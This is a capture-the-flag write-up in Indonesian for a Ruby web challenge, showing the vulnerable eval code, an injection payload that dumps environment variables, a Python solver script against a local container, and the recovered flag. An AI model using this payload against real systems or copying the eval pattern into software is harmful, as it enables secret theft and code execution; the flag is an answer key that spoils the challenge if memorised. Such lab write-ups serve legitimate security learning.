# WriteUp: Rahasia Anis

## Overview

* **Judul:** Rahasia Anis
* **Kategori:** Input Injection
* **Poin:** 500
* **Deskripsi:** Bisa ngga lu mengungkap rahasia Anis?
* **Author:** (Unknown/Platform Specific)
* **URL:** `http://localhost:1337`

## Informasi Attachment

File yang diberikan adalah `codex5.yml`.

**Struktur Direktori:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Input Injection/Rahasia Anis]
└─$ tree
.
├── codex5.yml
└── exploit.py

0 directories, 2 files

```

**Konten File (`codex5.yml`):**

```yaml
services:
  web:
    image: ghcr.io/hengkerrusia/codex5:latest
    ports:
      - "1337:8080"
    environment:
      - PWN=${PWN:-testuser}
    restart: unless-stopped

```

## Proses Penyelesaian

### 1. Menjalankan Environment

Challenge dijalankan menggunakan Docker Compose pada port **1337**.

**Output Terminal:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Input Injection/Rahasia Anis]
└─$ PWN=WanZKey docker compose -f codex5.yml up -d --build
[+] up 13/13
 ✔ Image ghcr.io/hengkerrusia/codex5:latest Pulled                                                                 28.7s
 ✔ Network rahasiaanis_default  Created                                                                             0.4s
 ✔ Container rahasiaanis-web-1  Created                                                                             1.4s

```

### 2. Reconnaissance & Source Code Analysis (White Box)

Melakukan inspeksi ke dalam container untuk mengidentifikasi bahasa pemrograman dan logika aplikasi. Ditemukan file `server.rb` (Ruby).

**Output Terminal:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Input Injection/Rahasia Anis]
└─$ docker exec -u WanZKey rahasiaanis-web-1 ls -la
total 12
drwxr-xr-x    1 root     root          4096 Jan 14 18:49 .
drwxr-xr-x    1 root     root          4096 Jan 14 18:49 ..
-rw-r--r--    1 root     root           608 Jan 14 12:42 server.rb

┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Input Injection/Rahasia Anis]
└─$ docker exec -u WanZKey rahasiaanis-web-1 cat server.rb
require 'webrick'
# ...
server.mount_proc '/' do |req, res|
  # ...
  begin
    # VULNERABILITY: Ruby Eval Injection
    # Input 'name' diinterpolasi ke dalam string double-quote, lalu dieksekusi eval()
    result = eval("'Hello ' + \"#{name}\"")

    res.body = result.to_s
  rescue Exception => e
    # ...
  end
end
# ...

```

**Analisis Kerentanan:**

1. **Language:** Ruby (WEBrick Server).
2. **Vulnerable Code:** `result = eval("'Hello ' + \"#{name}\"")`.
3. **Mechanism:** Input user (`name`) dimasukkan ke dalam string interpolation Ruby (`#{name}`) yang berada di dalam string *double-quotes* (`"`), yang kemudian dieksekusi oleh `eval`.
4. **Exploit Strategy:**
* Payload harus menutup *double-quote* pembuka (`"`).
* Menyisipkan kode Ruby untuk mengambil Environment Variable (`ENV`).
* **Catatan:** Menggunakan `ENV.to_s` hanya mengembalikan string `"ENV"`. Harus menggunakan `ENV.inspect` untuk melihat isi *key-value* environment variable (termasuk flag).
* Payload Final: `"+ENV.inspect+"`.



### 3. Exploitation

Mengirimkan payload melalui parameter HTTP GET `name` untuk mengekstrak Environment Variable.

## Script Solver

Script Python untuk melakukan eksploitasi otomatis.

**File:** `exploit.py`

```python
import requests
import re

# Target URL (Port 1337)
URL = "http://localhost:1337"

def exploit():
    print(f"[*] Target: {URL}")
    
    # Payload Ruby Injection
    # 1. "        -> Menutup string awal developer
    # 2. +        -> Operator konkatenasi string
    # 3. ENV.inspect -> Dump environment variable (termasuk flag)
    # 4. +        -> Konkatenasi penutup
    # 5. "        -> Membuka string penutup agar syntax valid
    payload = '"+ENV.inspect+"'
    
    print(f"[*] Sending Payload: {payload}")
    
    try:
        # Kirim GET request
        r = requests.get(URL, params={'name': payload})
        
        if r.status_code == 200:
            print("[+] Injection Successful!")
            
            # Regex Flag pwn{...}
            flag = re.search(r'pwn\{.*?\}', r.text)
            
            if flag:
                print(f"\n[!!!] FLAG FOUND: {flag.group(0)}\n")
            else:
                print("[-] Flag regex failed.")
                print(r.text[:500]) 
        else:
            print(f"[-] Error Status: {r.status_code}")
            print(r.text)
            
    except Exception as e:
        print(f"[-] Connection Error: {e}")

if __name__ == "__main__":
    exploit()

```

## Output Terminal Solver

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Input Injection/Rahasia Anis]
└─$ python3 exploit.py
[*] Target: http://localhost:1337
[*] Sending Payload: "+ENV.inspect+"
[+] Injection Successful!

[!!!] FLAG FOUND: pwn{56256f0ec095668d3cdc5e068bac0abe}

```

## Flag

```
pwn{56256f0ec095668d3cdc5e068bac0abe}

```
